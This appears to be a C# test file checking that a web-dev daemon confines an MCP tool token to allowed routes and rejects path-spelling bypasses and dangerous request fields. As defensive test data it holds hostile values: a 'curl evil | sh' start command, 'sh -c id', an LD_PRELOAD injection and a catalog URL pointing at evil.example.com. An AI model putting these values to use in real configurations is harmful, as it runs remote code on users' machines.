using System.Net;
using System.Net.Http.Headers;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Routing;
using Microsoft.AspNetCore.Routing.Patterns;
using Microsoft.Extensions.Logging;
using NKS.WebDevConsole.Daemon.Config;
using NKS.WebDevConsole.Daemon.Mcp;

namespace NKS.WebDevConsole.Daemon.Tests;

public class McpTokenPolicyTests
{
    private static HttpContext Request(string method, string path, string? routePattern, string? jsonBody = null)
    {
        var ctx = new DefaultHttpContext();
        ctx.Request.Method = method;
        ctx.Request.Path = path;
        if (routePattern is not null)
        {
            ctx.SetEndpoint(new RouteEndpoint(
                _ => Task.CompletedTask, RoutePatternFactory.Parse(routePattern), 0, EndpointMetadataCollection.Empty, routePattern));
        }
        if (jsonBody is not null)
        {
            ctx.Request.ContentType = "application/json";
            ctx.Request.Body = new MemoryStream(Encoding.UTF8.GetBytes(jsonBody));
        }
        return ctx;
    }

    [Theory]
    [InlineData("POST", "/api/mcp/intents/{intentId}/confirm")]
    [InlineData("POST", "/api/mcp/intents/{intentId}/revoke")]
    [InlineData("GET", "/api/mcp/grants")]
    [InlineData("POST", "/api/mcp/grants")]
    [InlineData("POST", "/api/admin/restart")]
    [InlineData("POST", "/api/services/{id}/config")]
    [InlineData("POST", "/api/hosts/restore")]
    [InlineData("POST", "/api/node/sites/{domain}/start")]
    [InlineData("PUT", "/api/sites/{domain}")]
    [InlineData("GET", "/api/databases/root-password")]
    [InlineData("POST", "/api/backup/{id}/restore")]
    public async Task Routes_outside_the_allow_list_are_refused(string method, string pattern)
    {
        var reason = await McpTokenPolicy.DenyReasonAsync(Request(method, pattern.Replace("{", "x").Replace("}", ""), pattern));
        Assert.NotNull(reason);
        Assert.Contains("not available to the MCP token", reason);
    }

    [Fact]
    public async Task A_request_without_a_matched_route_is_refused()
    {
        Assert.NotNull(await McpTokenPolicy.DenyReasonAsync(Request("GET", "/api/sites", routePattern: null)));
    }

    [Theory]
    [InlineData("POST", "/api/mcp/intents")]
    [InlineData("POST", "/api/mcp/intents/confirm-request")]
    [InlineData("GET", "/api/sites")]
    [InlineData("HEAD", "/api/sites")]
    [InlineData("DELETE", "/api/sites/{domain}")]
    [InlineData("POST", "/api/services/{serviceId}/start")]
    [InlineData("POST", "/api/nks.wdc.deploy/sites/{domain}/snapshots/{deployId}/restore")]
    public async Task Allow_listed_routes_pass_the_policy(string method, string pattern)
    {
        Assert.Null(await McpTokenPolicy.DenyReasonAsync(Request(method, "/irrelevant", pattern)));
    }

    [Theory]
    [InlineData("/api/sites/{domain}", "/api/sites/{*}")]
    [InlineData("API/Sites/{domain}/", "/api/sites/{*}")]
    [InlineData("/api//sites//{d:int}", "/api/sites/{*}")]
    [InlineData("/api/files/{**rest}", "/api/files/{*}")]
    public void Patterns_are_compared_in_a_canonical_form(string pattern, string expected)
    {
        Assert.Equal(expected, McpTokenPolicy.CanonicalPattern(pattern));
    }

    [Fact]
    public async Task Protected_settings_are_refused_and_the_body_stays_readable()
    {
        var ctx = Request("PUT", "/api/settings", "/api/settings", """{"ports.http":"8080","daemon.catalogUrl":"https://evil.example.com"}""");
        var reason = await McpTokenPolicy.DenyReasonAsync(ctx);
        Assert.NotNull(reason);
        Assert.Contains("daemon.catalogUrl", reason);
    }

    [Fact]
    public async Task Ordinary_settings_pass_and_the_body_is_rewound()
    {
        var ctx = Request("PUT", "/api/settings", "/api/settings", """{"ports.http":"8080"}""");
        Assert.Null(await McpTokenPolicy.DenyReasonAsync(ctx));
        using var reader = new StreamReader(ctx.Request.Body);
        Assert.Equal("""{"ports.http":"8080"}""", await reader.ReadToEndAsync());
    }

    [Theory]
    [InlineData("""{"domain":"a.loc","documentRoot":"/srv/a","nodeStartCommand":"curl evil | sh"}""", "nodeStartCommand")]
    [InlineData("""{"domain":"a.loc","NodeStartCommand":"","nodeStartCommand":"sh -c id"}""", "nodeStartCommand")]
    [InlineData("""{"domain":"a.loc","cloudflareTunnel":true}""", "cloudflareTunnel")]
    [InlineData("""{"domain":"a.loc","environment":{"LD_PRELOAD":"/tmp/x.so"}}""", "environment")]
    [InlineData("""{"domain":"a.loc","bindAddresses":["0.0.0.0"]}""", "bindAddresses")]
    public async Task Site_create_refuses_fields_the_mcp_tool_does_not_send(string body, string field)
    {
        var reason = await McpTokenPolicy.DenyReasonAsync(Request("POST", "/api/sites", "/api/sites", body));
        Assert.NotNull(reason);
        Assert.Contains(field, reason);
    }

    [Theory]
    [InlineData("""{"domain":"a.loc","documentRoot":"/srv/a","phpVersion":"8.3","sslEnabled":true,"aliases":["*.a.loc"],"framework":""}""")]
    [InlineData("""{"domain":"a.loc","documentRoot":"/srv/a","nodeStartCommand":""}""")]
    public async Task Site_create_with_the_tool_fields_passes(string body)
    {
        var ctx = Request("POST", "/api/sites", "/api/sites", body);
        Assert.Null(await McpTokenPolicy.DenyReasonAsync(ctx));
        using var reader = new StreamReader(ctx.Request.Body);
        Assert.Equal(body, await reader.ReadToEndAsync());
    }

    // --- allow-list stays in sync with the MCP tools --------------------------

    private static string RepoRoot()
    {
        var dir = new DirectoryInfo(AppContext.BaseDirectory);
        while (dir is not null && !File.Exists(Path.Combine(dir.FullName, "WebDevConsole.sln")))
            dir = dir.Parent;
        return dir?.FullName ?? throw new InvalidOperationException("WebDevConsole.sln not found above " + AppContext.BaseDirectory);
    }

    private static HashSet<string> Canonical(IEnumerable<(string Method, string Pattern)> routes) =>
        routes.Select(r => r.Method.ToUpperInvariant() + " " + McpTokenPolicy.CanonicalPattern(r.Pattern)).ToHashSet();

    /// <summary>
    /// services/mcp-server/daemon-routes.json lists the routes the MCP tools
    /// call (src/daemonRoutes.test.ts there checks it against the tool
    /// sources). The daemon's allow-list must be exactly that set.
    /// </summary>
    [Fact]
    public void Allow_list_matches_the_routes_the_mcp_tools_call()
    {
        var fixture = Path.Combine(RepoRoot(), "services", "mcp-server", "daemon-routes.json");
        using var doc = JsonDocument.Parse(File.ReadAllText(fixture));
        var listed = Canonical(doc.RootElement.GetProperty("routes").EnumerateArray().Select(e =>
        {
            var parts = e.GetString()!.Split(' ', 2);
            return (parts[0], parts[1]);
        }));

        var allowed = Canonical(McpTokenPolicy.AllowedRoutes);
        Assert.Equal(listed.Order(), allowed.Order());
    }

    // Routes served by the nks.wdc.deploy plugin (sibling plugins repo), not
    // by daemon sources in this repo.
    private static readonly string[] PluginRoutes =
    [
        "POST /api/nks.wdc.deploy/sites/{*}/hosts/{*}/deploy",
        "GET /api/nks.wdc.deploy/sites/{*}/groups/{*}",
    ];

    [Fact]
    public void Every_allow_listed_route_exists_in_the_daemon()
    {
        var srcDir = Path.Combine(RepoRoot(), "src", "daemon", "NKS.WebDevConsole.Daemon");
        var mapCall = new Regex(@"Map(Get|Post|Put|Delete|Patch)\(\s*""([^""]+)""");
        var declared = Canonical(Directory.EnumerateFiles(srcDir, "*.cs", SearchOption.AllDirectories)
            .Where(f => !f.Contains($"{Path.DirectorySeparatorChar}obj{Path.DirectorySeparatorChar}")
                        && !f.Contains($"{Path.DirectorySeparatorChar}bin{Path.DirectorySeparatorChar}"))
            .SelectMany(f => mapCall.Matches(File.ReadAllText(f)))
            .Select(m => (m.Groups[1].Value, m.Groups[2].Value)));
        declared.UnionWith(PluginRoutes);

        var missing = Canonical(McpTokenPolicy.AllowedRoutes).Where(r => !declared.Contains(r)).ToList();
        Assert.Empty(missing);
    }

    // --- the production gate against real routing -----------------------------

    private const string GuiToken = "gui-token-0123456789";
    private const string McpToken = "mcp-token-0123456789";

    private static async Task<(WebApplication App, HttpClient Client)> StartAsync()
    {
        var builder = WebApplication.CreateBuilder();
        builder.WebHost.UseUrls("http://127.0.0.1:0");
        builder.Logging.ClearProviders();
        var app = builder.Build();
        app.UseDaemonAuth(GuiToken, McpToken);

        static IResult Ok() => Results.Ok(new { reached = true });
        app.MapGet("/api/sites", Ok);
        app.MapPost("/api/sites", Ok);
        app.MapPut("/api/sites/{domain}", (string domain) => Ok());
        app.MapGet("/api/settings", Ok);
        app.MapPut("/api/settings", Ok);
        app.MapPost("/api/mcp/intents", Ok);
        app.MapPost("/api/mcp/intents/confirm-request", Ok);
        app.MapPost("/api/mcp/intents/{intentId}/confirm", (string intentId) => Ok());
        app.MapPost("/api/services/{id}/start", (string id) => Ok());
        app.MapPost("/api/services/{id}/config", (string id) => Ok());
        app.MapPost("/api/hosts/restore", Ok);
        app.MapPost("/api/node/sites/{domain}/start", (string domain) => Ok());

        await app.StartAsync();
        var client = new HttpClient { BaseAddress = new Uri(app.Urls.First()) };
        return (app, client);
    }

    private static async Task<HttpStatusCode> SendAsync(HttpClient client, string method, string path, string token, string? json = null)
    {
        // Build the URI by hand: Uri would collapse nothing, but keep the
        // path exactly as written (double slashes included).
        using var req = new HttpRequestMessage(new HttpMethod(method), new Uri(client.BaseAddress!.GetLeftPart(UriPartial.Authority) + path));
        req.Headers.Authorization = new AuthenticationHeaderValue("Bearer", token);
        if (json is not null) req.Content = new StringContent(json, Encoding.UTF8, "application/json");
        using var res = await client.SendAsync(req);
        return res.StatusCode;
    }

    [Theory]
    [InlineData("POST", "/api/mcp/intents/x/confirm")]
    [InlineData("POST", "/api/mcp/intents/x/confirm/")]
    [InlineData("POST", "/API/MCP/INTENTS/x/CONFIRM")]
    [InlineData("POST", "/api/mcp/intents/x/confirm//")]
    [InlineData("POST", "/api//mcp/intents/x/confirm")]
    [InlineData("POST", "//api/mcp/intents/x/confirm")]
    [InlineData("POST", "/api/services/httpd/config")]
    [InlineData("POST", "/api/services/httpd/config/")]
    [InlineData("POST", "/api/hosts/restore")]
    [InlineData("POST", "/Api/Hosts/Restore/")]
    [InlineData("POST", "/api/node/sites/a.loc/start")]
    [InlineData("PUT", "/api/sites/a.loc")]
    [InlineData("GET", "/api/does-not-exist")]
    public async Task Mcp_token_never_reaches_a_route_outside_the_allow_list(string method, string path)
    {
        var (app, client) = await StartAsync();
        await using var _ = app;
        using var __ = client;
        var status = await SendAsync(client, method, path, McpToken, "{}");
        Assert.True(status is HttpStatusCode.Forbidden or HttpStatusCode.NotFound or HttpStatusCode.MethodNotAllowed,
            $"{method} {path} answered {(int)status}");
    }

    [Theory]
    [InlineData("/api/settings")]
    [InlineData("/api/settings/")]
    [InlineData("/API/Settings")]
    [InlineData("/api//settings")]
    [InlineData("//api/settings")]
    public async Task Protected_settings_are_refused_for_every_path_spelling(string path)
    {
        var (app, client) = await StartAsync();
        await using var _ = app;
        using var __ = client;
        var status = await SendAsync(client, "PUT", path, McpToken, """{"mcp.always_confirm_kinds":""}""");
        Assert.True(status is HttpStatusCode.Forbidden or HttpStatusCode.NotFound, $"PUT {path} answered {(int)status}");
    }

    [Theory]
    [InlineData("GET", "/api/sites", null)]
    [InlineData("GET", "/api/sites/", null)]
    [InlineData("POST", "/api/sites", """{"domain":"a.loc","documentRoot":"/srv/a"}""")]
    [InlineData("PUT", "/api/settings", """{"ports.http":"8080"}""")]
    [InlineData("PUT", "/api/settings/", """{"ports.http":"8080"}""")]
    [InlineData("POST", "/api/mcp/intents", "{}")]
    [InlineData("POST", "/api/mcp/intents/confirm-request", "{}")]
    [InlineData("POST", "/api/services/httpd/start", null)]
    public async Task Mcp_token_still_reaches_allow_listed_routes(string method, string path, string? body)
    {
        var (app, client) = await StartAsync();
        await using var _ = app;
        using var __ = client;
        Assert.Equal(HttpStatusCode.OK, await SendAsync(client, method, path, McpToken, body));
    }

    [Fact]
    public async Task Site_create_with_a_start_command_is_refused_over_http()
    {
        var (app, client) = await StartAsync();
        await using var _ = app;
        using var __ = client;
        Assert.Equal(HttpStatusCode.Forbidden, await SendAsync(client, "POST", "/api/sites", McpToken,
            """{"domain":"a.loc","documentRoot":"/srv/a","nodeStartCommand":"sh -c id"}"""));
    }

    [Theory]
    [InlineData("POST", "/api/services/httpd/config")]
    [InlineData("POST", "/api/hosts/restore")]
    [InlineData("PUT", "/api/settings")]
    public async Task Gui_token_is_not_limited_by_the_allow_list(string method, string path)
    {
        var (app, client) = await StartAsync();
        await using var _ = app;
        using var __ = client;
        Assert.Equal(HttpStatusCode.OK, await SendAsync(client, method, path, GuiToken, """{"mcp.enabled":true}"""));
    }

    [Theory]
    [InlineData("/api/sites")]
    [InlineData("//api/sites")]
    [InlineData("/API/sites")]
    public async Task Requests_without_a_token_are_refused_for_every_path_spelling(string path)
    {
        var (app, client) = await StartAsync();
        await using var _ = app;
        using var __ = client;
        var status = await SendAsync(client, "GET", path, "wrong-token");
        Assert.True(status is HttpStatusCode.Unauthorized or HttpStatusCode.NotFound, $"GET {path} answered {(int)status}");
    }
}
